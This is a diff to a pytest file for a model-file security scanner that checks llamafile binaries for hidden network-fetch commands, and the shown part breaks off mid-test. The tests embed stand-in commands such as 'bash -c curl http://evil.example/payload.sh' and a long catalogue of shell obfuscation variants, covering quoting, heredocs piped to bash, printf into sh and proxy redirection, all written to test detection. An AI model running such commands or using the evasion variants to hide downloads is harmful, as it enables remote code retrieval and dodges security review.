@@ -26,7 +26,9 @@ from modelaudit.scanners.llamafile_scanner import (
     LLAMAFILE_ROUTE_TAIL_SCAN_BYTES,
     LLAMAFILE_RUNTIME_INTERPRETER_TOKEN_LIMIT_REASON,
     LLAMAFILE_RUNTIME_MAX_EVIDENCE,
+    LLAMAFILE_RUNTIME_MAX_INTERPRETER_CANDIDATES,
     LLAMAFILE_RUNTIME_MAX_INTERPRETER_TOKENS,
+    LLAMAFILE_RUNTIME_MAX_TRANSFER_CONTEXT_BYTES,
     LLAMAFILE_RUNTIME_MAX_TRANSFER_TOKENS,
     LLAMAFILE_RUNTIME_PREVIEW_READ_REASON,
     LLAMAFILE_RUNTIME_SCAN_LIMIT_REASON,
@@ -36,6 +38,8 @@ from modelaudit.scanners.llamafile_scanner import (
     LLAMAFILE_RUNTIME_TRANSFER_OPTION_AMBIGUOUS_REASON,
     LLAMAFILE_RUNTIME_TRANSFER_TOKEN_LIMIT_REASON,
     LLAMAFILE_RUNTIME_UTF16_AMBIGUOUS_REASON,
+    LLAMAFILE_TORCH7_CANDIDATE_PROBE_LIMIT_REASON,
+    LLAMAFILE_TORCH7_MAX_MARKER_CANDIDATES,
     LlamafileScanner,
     find_structural_torch7_offset,
 )
@@ -194,6 +198,37 @@ def _write_ape_zip_llamafile(
     path.write_bytes(bytes(stub) + archive_bytes)
 
 
+def _write_ape_raw_llamafile(
+    path: Path,
+    *,
+    file_size: int,
+    gguf_payload: bytes,
+    runtime_offset: int | None = None,
+    runtime: bytes | None = None,
+    later_elf_offset: int | None = None,
+) -> int:
+    gguf_offset = 24 * 1024
+    with path.open("wb") as handle:
+        header = bytearray(_build_mapped_executable_header("pe", 4096))
+        header[:6] = b"MZqFpD"
+        handle.write(header)
+        handle.seek(1024)
+        handle.write(b"llamafile runtime\n")
+        handle.seek(8 * 1024)
+        handle.write(_build_mapped_executable_header("elf", 8 * 1024, elf_machine=183))
+        handle.seek(gguf_offset)
+        handle.write(gguf_payload)
+        if runtime_offset is not None and runtime is not None:
+            handle.seek(runtime_offset)
+            handle.write(runtime)
+        if later_elf_offset is not None:
+            handle.seek(later_elf_offset)
+            handle.write(_build_mapped_executable_header("elf", 8 * 1024, elf_machine=183))
+        handle.seek(file_size - 1)
+        handle.write(b"\x00")
+    return gguf_offset
+
+
 def test_llamafile_scanner_can_handle_detected_llamafile(tmp_path: Path) -> None:
     binary = tmp_path / "model.llamafile"
     binary.write_bytes(_build_llamafile_blob())
@@ -338,6 +373,76 @@ def test_llamafile_scanner_preserves_runtime_strings_across_stream_chunks(
         assert runtime_checks[0].details["network_evidence"]
     else:
         assert result.success is True
+
+
+def test_llamafile_scanner_preserves_literal_heredoc_state_across_stream_chunks(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    declaration = "cat <<'EOF'\n"
+    chunk_size = 64 + len(b"llamafile runtime\n") + len(declaration.encode())
+    monkeypatch.setattr(llamafile_scanner_module, "LLAMAFILE_RUNTIME_STREAM_CHUNK_BYTES", chunk_size)
+    binary = tmp_path / "chunk-boundary-literal-heredoc.llamafile"
+    binary.write_bytes(_build_llamafile_blob(runtime_lines=[f"{declaration}curl internal-host\nEOF"]))
+
+    result = LlamafileScanner().scan(str(binary))
+
+    runtime_checks = [check for check in result.checks if check.name == "Llamafile Runtime String Analysis"]
+    assert not any(check.severity == IssueSeverity.CRITICAL for check in runtime_checks)
+
+
+def test_llamafile_streaming_nul_terminates_literal_heredoc_state(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    declaration = "cat <<'EOF'\0"
+    chunk_size = 64 + len(b"llamafile runtime\n") + len(declaration.encode())
+    monkeypatch.setattr(llamafile_scanner_module, "LLAMAFILE_RUNTIME_STREAM_CHUNK_BYTES", chunk_size)
+    binary = tmp_path / "chunk-boundary-nul-heredoc.llamafile"
+    binary.write_bytes(_build_llamafile_blob(runtime_lines=[f"{declaration}curl internal-host\0EOF"]))
+
+    result = LlamafileScanner().scan(str(binary))
+
+    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)
+
+
+def test_llamafile_literal_heredoc_analysis_does_not_rescan_unterminated_bodies(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    original = llamafile_scanner_module._shell_heredoc_declarations
+    calls = 0
+
+    def count_declarations(line: str) -> list[tuple[str, bool, bool]]:
+        nonlocal calls
+        calls += 1
+        return original(line)
+
+    monkeypatch.setattr(llamafile_scanner_module, "_shell_heredoc_declarations", count_declarations)
+
+    spans = llamafile_scanner_module._quoted_heredoc_body_spans("cat <<'EOF'\n" * 8_000)
+
+    assert calls == 1
+    assert spans == [(len("cat <<'EOF'\n"), len("cat <<'EOF'\n") * 8_000)]
+
+
+def test_llamafile_literal_heredoc_declarations_bound_context_parsing(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    original = llamafile_scanner_module._heredoc_body_is_passive_data
+    calls = 0
+
+    def count_context(line: str, operator_start: int) -> bool:
+        nonlocal calls
+        calls += 1
+        return original(line, operator_start)
+
+    monkeypatch.setattr(llamafile_scanner_module, "_heredoc_body_is_passive_data", count_context)
+
+    declarations = llamafile_scanner_module._shell_heredoc_declarations("cat " + "<<'EOF' " * 800)
+
+    assert calls == 1
+    assert len(declarations) == llamafile_scanner_module.LLAMAFILE_RUNTIME_MAX_HEREDOC_DECLARATIONS
 
 
 @pytest.mark.parametrize("executable_format", ["elf", "pe", "mach-o"])
@@ -845,6 +950,104 @@ def test_llamafile_scanner_does_not_trust_ape_gguf_decoy_before_embedded_elf(tmp
     )
 
 
+def test_llamafile_scanner_scans_runtime_after_gguf_in_bounded_ape_search(tmp_path: Path) -> None:
+    binary = tmp_path / "bounded-ape-runtime-after-gguf.llamafile"
+    _write_ape_raw_llamafile(
+        binary,
+        file_size=128 * 1024,
+        gguf_payload=b"GGUF" + struct.pack("<IQQ", 3, 0, 0),
+        runtime_offset=28 * 1024,
+        runtime=b"bash -c curl http://evil.example/payload.sh",
+        later_elf_offset=64 * 1024,
+    )
+
+    result = LlamafileScanner(config={"llamafile_payload_scan_bytes": 32 * 1024, "llamafile_preview_bytes": 64}).scan(
+        str(binary)
+    )
+
+    assert result.metadata["embedded_payload_boundary_trusted"] is False
+    assert LLAMAFILE_PAYLOAD_SCAN_LIMIT_REASON in result.metadata["scan_outcome_reasons"]
+    assert LLAMAFILE_RUNTIME_SCAN_LIMIT_REASON in result.metadata["scan_outcome_reasons"]
+    assert any(
+        check.name == "Llamafile Runtime String Analysis" and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+
+
+def test_llamafile_scanner_trusts_complete_ape_mapping_search_before_benign_gguf(tmp_path: Path) -> None:
+    binary = tmp_path / "complete-ape-benign-gguf.llamafile"
+    payload_offset = _write_ape_raw_llamafile(
+        binary,
+        file_size=32 * 1024,
+        gguf_payload=_build_gguf_string_metadata(
+            [("general.description", "bash -c curl http://model-data.example/payload.sh")]
+        ),
+    )
+
+    result = LlamafileScanner(
+        config={"llamafile_payload_scan_bytes": binary.stat().st_size, "llamafile_preview_bytes": 64}
+    ).scan(str(binary))
+
+    assert result.success is True
+    assert result.metadata["embedded_payload_offset"] == payload_offset
+    assert result.metadata["embedded_payload_boundary_trusted"] is True
+    assert result.metadata["embedded_payload_boundary_source"] == "executable_mapping"
+    assert not any(check.name == "Llamafile Runtime String Analysis" for check in result.checks)
+
+
+def test_llamafile_scanner_fails_closed_for_incomplete_ape_mapping_search(tmp_path: Path) -> None:
+    binary = tmp_path / "bounded-ape-unscanned-runtime.llamafile"
+    _write_ape_raw_llamafile(
+        binary,
+        file_size=128 * 1024,
+        gguf_payload=b"GGUF" + struct.pack("<IQQ", 3, 0, 0),
+        runtime_offset=96 * 1024,
+        runtime=b"bash -c curl http://evil.example/payload.sh",
+        later_elf_offset=64 * 1024,
+    )
+    config = {"llamafile_payload_scan_bytes": 32 * 1024, "llamafile_preview_bytes": 64}
+
+    direct = LlamafileScanner(config=config).scan(str(binary))
+
+    assert direct.success is False
+    assert direct.metadata["embedded_payload_boundary_trusted"] is False
+    assert LLAMAFILE_PAYLOAD_SCAN_LIMIT_REASON in direct.metadata["scan_outcome_reasons"]
+    assert LLAMAFILE_RUNTIME_SCAN_LIMIT_REASON in direct.metadata["scan_outcome_reasons"]
+    payload_checks = [check for check in direct.checks if check.name == "Llamafile Embedded Payload Coverage"]
+    assert len(payload_checks) == 1
+    assert payload_checks[0].message == "Embedded payload discovery stopped at the bounded scan window"
+    runtime_checks = [check for check in direct.checks if check.name == "Llamafile Runtime Coverage"]
+    assert len(runtime_checks) == 1
+    assert runtime_checks[0].message == "Executable runtime extends beyond the bounded streaming scan window"
+    assert not any(check.name == "Llamafile Runtime String Analysis" for check in direct.checks)
+
+    aggregate = scan_model_directory_or_file(
+        str(binary),
+        cache_scan_results=False,
+        llamafile_payload_scan_bytes=32 * 1024,
+        llamafile_preview_bytes=64,
+    )
+    assert aggregate.success is False
+    assert determine_exit_code(aggregate) == 2
+
+    cache_dir = tmp_path / "bounded-ape-cache"
+    reset_cache_manager()
+    try:
+        cached_aggregate = scan_model_directory_or_file(
+            str(binary),
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+            llamafile_payload_scan_bytes=32 * 1024,
+            llamafile_preview_bytes=64,
+        )
+        assert cached_aggregate.success is False
+        assert determine_exit_code(cached_aggregate) == 2
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+
 @pytest.mark.parametrize("executable_format", ["elf", "ape"])
 def test_llamafile_scanner_accepts_large_raw_payload_after_trusted_mapping(
     tmp_path: Path,
@@ -863,7 +1066,7 @@ def test_llamafile_scanner_accepts_large_raw_payload_after_trusted_mapping(
             handle.seek(8 * 1024 * 1024)
             handle.write(_build_mapped_executable_header("elf", 1024 * 1024, elf_machine=183))
 
-    result = LlamafileScanner(config={"llamafile_payload_scan_bytes": 11 * 1024 * 1024}).scan(str(binary))
+    result = LlamafileScanner(config={"llamafile_payload_scan_bytes": binary.stat().st_size}).scan(str(binary))
 
     assert result.success is True
     assert result.metadata["embedded_payload_boundary_trusted"] is True
@@ -963,6 +1166,31 @@ def test_llamafile_runtime_evidence_retention_is_bounded(monkeypatch: pytest.Mon
     assert candidates_scanned == 100
     assert correlated_signal_seen is True
     assert redaction_calls == LLAMAFILE_RUNTIME_MAX_EVIDENCE
+
+
+def test_llamafile_remote_transfer_short_circuits_repeated_command_contexts(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    context_calls = 0
+    original_context = llamafile_scanner_module._transfer_command_context
+
+    def counting_context(*args: Any, **kwargs: Any) -> tuple[bool, int | None, bool, bool]:
+        nonlocal context_calls
+        context_calls += 1
+        return original_context(*args, **kwargs)
+
+    monkeypatch.setattr(llamafile_scanner_module, "_transfer_command_context", counting_context)
+
+    signals = llamafile_scanner_module._runtime_text_signals(" ".join(["curl internal-host"] * 64))
+
+    assert signals == (True, True, False, False, False)
+    assert context_calls == 1
+
+    context_calls = 0
+    signals = llamafile_scanner_module._runtime_text_signals(" ".join(["echo curl internal-host"] * 64))
+
+    assert signals == (False, False, False, False, False)
+    assert context_calls == 1
 
 
 def test_llamafile_scanner_marks_omitted_runtime_bytes_inconclusive(tmp_path: Path) -> None:
@@ -1138,6 +1366,43 @@ def test_llamafile_bounds_torch7_scan_attempts_after_marker_decoys(
         and check.severity == IssueSeverity.WARNING
         for check in result.checks
     )
+
+
+def test_llamafile_fails_closed_when_torch7_marker_probe_limit_is_exceeded(tmp_path: Path) -> None:
+    binary = tmp_path / "torch7-marker-probe-limit.llamafile"
+    decoys = b"T7\x00\x00" * (LLAMAFILE_TORCH7_MAX_MARKER_CANDIDATES + 1)
+    binary.write_bytes(_build_llamafile_blob(embedded_payload=decoys))
+
+    direct = LlamafileScanner().scan(str(binary))
+
+    assert direct.success is False
+    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert LLAMAFILE_TORCH7_CANDIDATE_PROBE_LIMIT_REASON in direct.metadata["scan_outcome_reasons"]
+    coverage_check = next(
+        check for check in direct.checks if check.name == "Llamafile Embedded Torch7 Candidate Coverage"
+    )
+    assert coverage_check.message == (
+        f"Stopped embedded Torch7 analysis after {LLAMAFILE_TORCH7_MAX_MARKER_CANDIDATES} candidate markers"
+    )
+
+    aggregate = scan_model_directory_or_file(str(binary), cache_scan_results=False)
+    assert aggregate.success is False
+    assert determine_exit_code(aggregate) == 2
+
+    cache_dir = tmp_path / "torch7-marker-probe-limit-cache"
+    reset_cache_manager()
+    try:
+        cached_aggregate = scan_model_directory_or_file(
+            str(binary),
+            cache_enabled=True,
+            cache_dir=str(cache_dir),
+            min_cache_file_size=0,
+        )
+        assert cached_aggregate.success is False
+        assert determine_exit_code(cached_aggregate) == 2
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
 
 
 def test_llamafile_finds_torch7_in_initial_payload_pass_while_skipping_marker_decoys(
@@ -1858,6 +2123,80 @@ def test_llamafile_transfer_token_limit_is_inconclusive_and_not_cached(tmp_path:
         reset_cache_manager()
 
 
+def test_llamafile_transfer_command_preprocessing_is_bounded() -> None:
+    runtime_text = "echo curl internal-host ; " * 1_600
+
+    _, _, token_scan_limited, _, _ = llamafile_scanner_module._runtime_text_signals(runtime_text)
+
+    assert token_scan_limited is True
+
+
+def test_llamafile_shell_stdin_pipeline_parsing_is_bounded() -> None:
+    runtime_text = "curl internal-host " + ("| x " * (LLAMAFILE_RUNTIME_MAX_TRANSFER_TOKENS + 1))
+
+    _, _, token_scan_limited, _, _ = llamafile_scanner_module._runtime_text_signals(runtime_text)
+
+    assert token_scan_limited is True
+
+
+def test_llamafile_shell_printf_output_is_bounded() -> None:
+    output = llamafile_scanner_module._shell_printf_output("curl %s " + ("x" * 4096), ["host"] * 1000)
+
+    assert len(output) == LLAMAFILE_RUNTIME_MAX_TRANSFER_CONTEXT_BYTES
+    assert output.startswith("curl host ")
+
+
+def test_llamafile_python_line_is_parsed_once(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    runtime_text = "values = [" + ",".join(["'curl internal-host'"] * 64) + "]; marker = os.system"
+    parse_calls = 0
+    original_parse = llamafile_scanner_module.ast.parse
+
+    def counting_parse(*args: Any, **kwargs: Any) -> Any:
+        nonlocal parse_calls
+        parse_calls += 1
+        return original_parse(*args, **kwargs)
+
+    monkeypatch.setattr(llamafile_scanner_module.ast, "parse", counting_parse)
+
+    assert llamafile_scanner_module._runtime_text_signals(runtime_text)[:2] == (False, False)
+    assert parse_calls == 1
+
+
+def test_llamafile_interpreter_candidate_parsing_is_bounded() -> None:
+    runtime_text = "bash " * (LLAMAFILE_RUNTIME_MAX_INTERPRETER_CANDIDATES + 1)
+
+    _, _, _, _, interpreter_scan_limited = llamafile_scanner_module._runtime_text_signals(runtime_text)
+
+    assert interpreter_scan_limited is True
+
+
+def test_llamafile_runtime_fragment_parsing_is_bounded() -> None:
+    runtime_text = "%'18t connect closed " * 65
+
+    _, _, token_scan_limited, _, _ = llamafile_scanner_module._runtime_text_signals(runtime_text)
+
+    assert token_scan_limited is True
+
+
+def test_llamafile_transfer_context_byte_limit_is_inconclusive(tmp_path: Path) -> None:
+    binary = tmp_path / "transfer-context-byte-limit.llamafile"
+    hidden_transfer = "A" * (LLAMAFILE_RUNTIME_MAX_TRANSFER_CONTEXT_BYTES + 1)
+    hidden_transfer += " curl internal-host"
+    binary.write_bytes(_build_llamafile_blob(runtime_lines=[hidden_transfer]))
+
+    direct = LlamafileScanner().scan(str(binary))
+
+    assert direct.success is False
+    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert LLAMAFILE_RUNTIME_TRANSFER_TOKEN_LIMIT_REASON in direct.metadata["scan_outcome_reasons"]
+    assert not any(
+        check.name == "Llamafile Runtime String Analysis" and check.severity == IssueSeverity.CRITICAL
+        for check in direct.checks
+    )
+
+
 def test_llamafile_interpreter_token_limit_is_inconclusive_and_not_cached(tmp_path: Path) -> None:
     binary = tmp_path / "interpreter-token-limit.llamafile"
     hidden_command = "python " + ("-B " * (LLAMAFILE_RUNTIME_MAX_INTERPRETER_TOKENS + 1))
@@ -1915,9 +2254,21 @@ def test_llamafile_interpreter_token_boundary_is_inconclusive(tmp_path: Path, ru
     assert LLAMAFILE_RUNTIME_INTERPRETER_TOKEN_LIMIT_REASON in result.metadata["scan_outcome_reasons"]
 
 
-def test_llamafile_transfer_option_ambiguity_is_inconclusive_and_not_cached(tmp_path: Path) -> None:
+@pytest.mark.parametrize(
+    "runtime_line",
+    [
+        "curl --future-option https://maybe.example",
+        "curl --future-option internal-host",
+        "curl -j internal-host",
+        "sudo --future curl internal-host",
+    ],
+)
+def test_llamafile_transfer_option_ambiguity_is_inconclusive_and_not_cached(
+    tmp_path: Path,
+    runtime_line: str,
+) -> None:
     binary = tmp_path / "transfer-option-ambiguity.llamafile"
-    binary.write_bytes(_build_llamafile_blob(runtime_lines=["curl --future-option https://maybe.example"]))
+    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_line]))
 
     direct = LlamafileScanner().scan(str(binary))
 
@@ -2303,11 +2654,165 @@ def test_llamafile_scanner_redacts_sensitive_runtime_evidence(tmp_path: Path) ->
         "curl --verbose evil.example/first http://localhost/second",
         "wget --timestamping evil.example/first http://localhost/second",
         "curl --proxy http://evil.example:8080 http://localhost/payload",
+        "curl --preproxy=socks5://evil.example:1080 http://localhost/payload",
+        "curl --proxy1.0 http://evil.example:8080 http://localhost/payload",
         "curl -x http://evil.example:8080 http://localhost/payload",
         "curl --connect-to localhost:80:evil.example:80 http://localhost/payload",
         "curl --resolve localhost:80:8.8.8.8 http://localhost/payload",
         "curl --doh-url https://evil.example/dns-query http://localhost/payload",
         "curl --dns-servers 127.0.0.1,8.8.8.8 http://localhost/payload",
+        "wget -e https_proxy=http://evil http://127.0.0.1/payload",
+        "wget --execute=https_proxy=http://evil http://127.0.0.1/payload",
+        "curl internal-host",
+        "curl inter''nal-host",
+        r"curl internal\-host",
+        r"c\u\r\l internal-host",
+        'c""url internal-host',
+        "curl user@evil.example",
+        "curl evil.example?x=1",
+        "/usr/bin/curl internal-host",
+        "bash -c 'curl internal-host'",
+        'bash -c "curl internal-host"',
+        "bash -c 'echo ok; curl internal-host'",
+        "bash -c 'true && curl internal-host'",
+        "bash -c '(curl internal-host)'",
+        "bash -c '{ curl internal-host; }'",
+        "bash -c '! curl internal-host'",
+        "bash -c 'if true; then curl internal-host; fi'",
+        "bash -c 'sudo /usr/bin/curl internal-host'",
+        "(curl internal-host)",
+        "{ curl internal-host; }",
+        "! curl internal-host",
+        "if true; then curl internal-host; fi",
+        "echo $(curl internal-host)",
+        "bash -c 'echo $(curl internal-host)'",
+        "bash -c 'echo `curl internal-host`'",
+        "bash -c 'echo \"$(curl internal-host)\"'",
+        "command env FOO=bar curl internal-host",
+        "time -p curl internal-host",
+        "/usr/bin/time -p curl internal-host",
+        "timeout 5 curl internal-host",
+        "nice -n 5 curl internal-host",
+        "setsid curl internal-host",
+        "stdbuf -o0 curl internal-host",
+        "xargs curl internal-host",
+        "find . -exec curl internal-host \\;",
+        "find . -exec curl internal-host '{}' +",
+        "find . -exec curl internal-host {} \\+",
+        "find . -exec curl internal-host {} '+'",
+        "find . -exec curl internal-host \\{\\} +",
+        "watch curl internal-host",
+        "busybox curl internal-host",
+        "parallel curl internal-host",
+        "strace curl internal-host",
+        "ionice curl internal-host",
+        "taskset 0x1 curl internal-host",
+        "chroot /sandbox curl internal-host",
+        "doas curl internal-host",
+        "runuser -u user -- curl internal-host",
+        "eval 'curl internal-host'",
+        "builtin exec curl internal-host",
+        "f(){ curl internal-host; }; f",
+        "subprocess.run(['curl', 'internal-host'])",
+        "subprocess.run('curl internal-host', shell=True)",
+        "echo ignored | echo 'curl internal-host' | bash",
+        "printf ignored | printf 'curl internal-host' | bash",
+        "echo ignored | printf '%s %s' curl internal-host | bash",
+        "printf '%b' 'curl\\x20internal-host' | bash",
+        "printf '%b' 'curl\\040internal-host' | bash",
+        "echo -e 'curl\\tinternal-host' | bash",
+        "bash <<< 'curl internal-host'; :",
+        "bash <<< 'curl internal-host' && echo ok",
+        "bash <<< 'curl internal-host' | cat",
+        "bash <<< 'curl internal-host' >out",
+        "bash >out <<< 'curl internal-host'",
+        "bash 2>/dev/null <<< 'curl internal-host'",
+        "<input bash <<< 'curl internal-host'",
+        "echo 'curl internal-host' | bash >out",
+        "echo 'curl internal-host' | bash 2>/dev/null",
+        "echo 'curl internal-host' 3>out | bash",
+        "echo 'curl internal-host' 0>in | bash",
+        "echo 'curl internal-host' 10>out | bash",
+        "echo 'curl internal-host' {fd}>out | bash",
+        "echo 'curl internal-host' |& bash",
+        "echo $(f(){ curl internal-host; }; f)",
+        'echo "$(f(){ curl internal-host; }; f)"',
+        "2>/dev/null curl internal-host",
+        "2>&1 curl internal-host",
+        ">&2 curl internal-host",
+        "<&0 curl internal-host",
+        "2>&- curl internal-host",
+        "2>|out curl internal-host",
+        ">out curl internal-host",
+        "<input curl internal-host",
+        "VAR=x 2>/dev/null curl internal-host",
+        "bash -c '2>/dev/null curl internal-host'",
+        r"echo `echo \`curl internal-host\``",
+        "echo curl; curl internal-host",
+        "FOO=curl curl internal-host",
+        "echo $(echo curl; curl internal-host)",
+        "case x in x) curl internal-host;; esac",
+        "case x in x|y) curl internal-host;; esac",
+        "coproc curl internal-host",
+        "coproc JOB { curl internal-host; }",
+        "time FOO=bar curl internal-host",
+        "env --split-string='curl internal-host'",
+        "env --split-string='FOO=bar curl internal-host'",
+        "env --split-string='env FOO=bar curl internal-host'",
+        'echo "$(curl internal-host)"',
+        "cat <<EOF\n$(curl internal-host)\nEOF",
+        "cat <<'EOF'\0curl internal-host\0EOF",
+        "bash <<'EOF'\ncurl internal-host\nEOF",
+        "/bin/sh <<'EOF'\nwget internal-host\nEOF",
+        "bash -s <<'EOF'\ncurl internal-host\nEOF",
+        "cat <<'EOF' | bash\ncurl internal-host\nEOF",
+        "tee output <<'EOF' | sh\nwget internal-host\nEOF",
+        "cat <<'EOF' > >(bash)\ncurl internal-host\nEOF",
+        "cat <<'EOF' | python\nimport os; os.system('curl internal-host')\nEOF",
+        "cat <<'EOF' > >(python)\nimport os; os.system('curl internal-host')\nEOF",
+        "cat <<'EOF' >payload\ncurl internal-host\nEOF\nbash payload",
+        "tee payload <<'EOF'\ncurl internal-host\nEOF\nsh payload",
+        "sort -o payload <<'EOF'\ncurl internal-host\nEOF\nbash payload",
+        "sort -opayload <<'EOF'\ncurl internal-host\nEOF\nbash payload",
+        "sort --output=payload <<'EOF'\ncurl internal-host\nEOF\nbash payload",
+        "uniq - payload <<'EOF'\ncurl internal-host\nEOF\nbash payload",
+        "sed -n 'w payload' <<'EOF'\ncurl internal-host\nEOF\nbash payload",
+        "sed 's/.*/&/w payload' <<'EOF'\ncurl internal-host\nEOF\nbash payload",
+        "sed -n '1w payload' <<'EOF'\ncurl internal-host\nEOF\nbash payload",
+        "bash <<< 'curl internal-host'",
+        "bash /dev/stdin <<< 'curl internal-host'",
+        "bash - <<< 'curl internal-host'",
+        "bash --login <<< 'curl internal-host'",
+        "echo 'curl internal-host' | bash /dev/stdin",
+        "sh <<<'wget internal-host'",
+        "bash -s -- foo <<< 'curl internal-host'",
+        "sh -s foo <<<'wget internal-host'",
+        "bash <<< $'curl internal-host'",
+        "bash <<< curl\\ internal-host",
+        "bash <<< 'curl 'internal-host",
+        "printf 'curl internal-host' | bash",
+        "echo 'curl internal-host' | sh",
+        "printf 'curl %s\\n' internal-host | bash",
+        "printf '%s %s\\n' curl internal-host | bash",
+        "printf 'curl internal-host %s' | bash",
+        "printf '%s curl internal-host' | bash",
+        "curl \\\ninternal-host",
+        "curl --silent \\\ninternal-host",
+        "wget --quiet \\\ninternal-host",
+        "curl 8.8",
+        "curl 8.8.8",
+        "curl 010.010.010.010",
+        "echo \"<<'EOF'\"\ncurl internal-host\nEOF",
+        "# <<'EOF'\ncurl internal-host\nEOF",
+        "bash -c $'curl internal-host'",
+        'cmd.exe /c "echo ok & curl internal-host"',
+        "cmd.exe /s /c curl internal-host",
+        "sudo curl internal-host",
+        "sudo -n curl internal-host",
+        "sudo --non-interactive curl internal-host",
+        "env curl internal-host",
+        "env -i curl internal-host",
+        "nohup -- curl internal-host",
         "/usr/bin/wget evil.example/payload.sh",
         '"curl" https://evil.example/payload.sh',
         '"/usr/bin/curl" https://evil.example/payload.sh',
@@ -2463,6 +2968,127 @@ def test_llamafile_scanner_does_not_correlate_command_near_matches(
 @pytest.mark.parametrize(
     "runtime_line",
     [
+        "bash -c echo curl internal-host",
+        "cmd.exe /c echo curl internal-host",
+        "python -c \"print('curl internal-host')\"",
+        "powershell Write-Output 'curl internal-host'",
+        "bash -c 'echo \"x; curl internal-host\"'",
+        "FOO=curl internal-host",
+        "FOO=/usr/bin/curl internal-host",
+        "env FOO=curl internal-host",
+        "sudo --prompt=curl internal-host",
+        "sudo --user=curl internal-host",
+        "sudo --future=curl internal-host",
+        "exec -a=curl internal-host",
+        "bash -c 'FOO=curl internal-host'",
+        "bash -c 'echo ok # ; curl internal-host'",
+        "command FOO=bar curl internal-host",
+        "nohup FOO=bar curl internal-host",
+        "exec FOO=bar curl internal-host",
+        "echo $(curl) internal-host",
+        "echo $(echo curl internal-host)",
+        "bash -c 'echo $(curl) internal-host'",
+        "bash -c 'echo `curl` internal-host'",
+        r"echo \$(curl internal-host)",
+        r"bash -c 'echo \$(curl internal-host)'",
+        "bash -c \"echo '$(curl internal-host)'\"",
+        "curl http://localhost/ ; curl --proxy http://evil.example:8080",
+        "curl --proxy http://evil.example:8080 ; curl http://localhost/",
+        "curl http://localhost/ ; wget -e https_proxy=http://evil.example",
+        "echo curl evil.example",
+        'echo case x in "x)" curl internal-host',
+        "printf '%s' case x in 'x)' curl internal-host",
+        "bash -c 'echo case x in \"x)\" curl internal-host'",
+        '"case" x in x) curl internal-host',
+        '"then" curl internal-host',
+        '"coproc" curl internal-host',
+        "env FOO=--split-string='curl internal-host'",
+        "env --split-string='echo curl internal-host'",
+        "cat <<'EOF'\ncurl internal-host\nEOF",
+        "cat <<'END-MARK'\ncurl internal-host\nEND-MARK",
+        "cat <<\\EOF\ncurl internal-host\nEOF",
+        "tee <<'EOF'\ncurl internal-host\nEOF",
+        "sort <<'EOF'\ncurl internal-host\nEOF",
+        "sed -n p <<'EOF'\ncurl internal-host\nEOF",
+        "wc -c <<'EOF'\ncurl internal-host\nEOF",
+        "bash -n <<'EOF'\ncurl internal-host\nEOF",
+        "bash -o noexec <<'EOF'\ncurl internal-host\nEOF",
+        "bash -n <<< 'curl internal-host'",
+        "bash <<< 'echo curl internal-host'",
+        "printf 'hello' 'curl internal-host' | bash",
+        "printf '%s' 'echo curl internal-host' | bash",
+        "echo 'echo curl internal-host' | bash",
+        "printf '%s\\n' curl internal-host | bash",
+        "echo 'curl internal-host' | cat",
+        "echo \\\ncurl internal-host",
+        "printf %s \\\nwget internal-host",
+        "curl \\\r\ninternal-host",
+        "timeout --help curl internal-host",
+        "nice --help curl internal-host",
+        "setsid --help curl internal-host",
+        "stdbuf --help curl internal-host",
+        "xargs --help curl internal-host",
+        "builtin curl internal-host",
+        "curl -V internal-host",
+        "curl -M internal-host",
+        "wget -V internal-host",
+        "wget -h internal-host",
+        "arr=(curl internal-host)",
+        "declare -a arr=(curl internal-host)",
+        "bash <<'EOF'\narr=(curl internal-host)\nEOF",
+        "curl user@localhost",
+        "find . -exec curl internal-host ;",
+        "find . -exec curl internal-host ; echo \\;",
+        "find . -exec curl internal-host && echo \\;",
+        "find . -exec curl internal-host || echo \\;",
+        "find . -exec curl internal-host | echo \\;",
+        "find . -exec curl internal-host & echo \\;",
+        "ionice -p 123 curl internal-host",
+        "strace -p 123 curl internal-host",
+        "doas -C conf curl internal-host",
+        "gdb --args curl internal-host",
+        "eval 'echo curl internal-host'",
+        "f(){ curl internal-host; }",
+        "echo 'x; f(){ curl internal-host; }; f ;'",
+        'echo "x; f(){ curl internal-host; }; f ;"',
+        "printf '%s' 'x; f(){ curl internal-host; }; f ;'",
+        "subprocess.run('curl internal-host')",
+        "print(\"os.system('curl internal-host')\")",
+        "# os.system('curl internal-host')",
+        "logger.info(\"subprocess.run('curl internal-host')\")",
+        "echo 'curl internal-host' | sed 's/curl/echo/' | bash",
+        "echo 'curl internal-host' | grep -v curl | bash",
+        "bash <<< 'curl internal-host' /dev/null",
+        "bash <<< 'curl internal-host' -n",
+        "echo 'curl\\tinternal-host' | bash",
+        "echo -E 'curl\\tinternal-host' | bash",
+        "echo 'curl internal-host' >/dev/null | bash",
+        "echo 'curl internal-host' 1>out | bash",
+        "echo 'curl internal-host' &>out | bash",
+        "echo 'curl internal-host' >&2 | bash",
+        "printf 'curl internal-host' >out | bash",
+        "echo 'curl internal-host' || bash",
+        "printf 'curl internal-host' || bash",
+        "bash <<< 'curl internal-host' < /dev/null",
+        "echo '$(f(){ curl internal-host; }; f)'",
+    ],
+)
+def test_llamafile_scanner_does_not_correlate_non_transfer_command_text(
+    tmp_path: Path,
+    runtime_line: str,
+) -> None:
+    binary = tmp_path / "non-transfer-command-text.llamafile"
+    binary.write_bytes(_build_llamafile_blob(runtime_lines=[runtime_line]))
+
+    result = LlamafileScanner().scan(str(binary))
+
+    runtime_checks = [check for check in result.checks if check.name == "Llamafile Runtime String Analysis"]
